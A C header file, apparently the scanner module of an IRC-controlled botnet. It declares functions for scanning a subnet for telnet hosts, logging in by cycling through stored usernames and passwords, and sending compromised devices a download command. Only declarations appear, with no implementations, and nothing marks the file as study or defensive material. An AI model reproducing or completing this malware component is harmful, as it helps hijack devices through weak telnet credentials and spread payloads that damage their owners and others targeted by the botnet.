#ifndef SCANNER_H
#define SCANNER_H

typedef struct {
	int fd_telnet;
	char ip[16];
} telnet_info;

int scan_network(irc_info *info, char *ip);
char * get_subnet_address();
int telnet_connect(telnet_info *info);
int telnet_login(telnet_info *info);
void terminal_set(int telnet_fd);
void send_download_command(int fd_telnet);
void download_credentials_file();
void remove_credentials_file();
void get_next_credentials(char **user, char **pass);

#endif
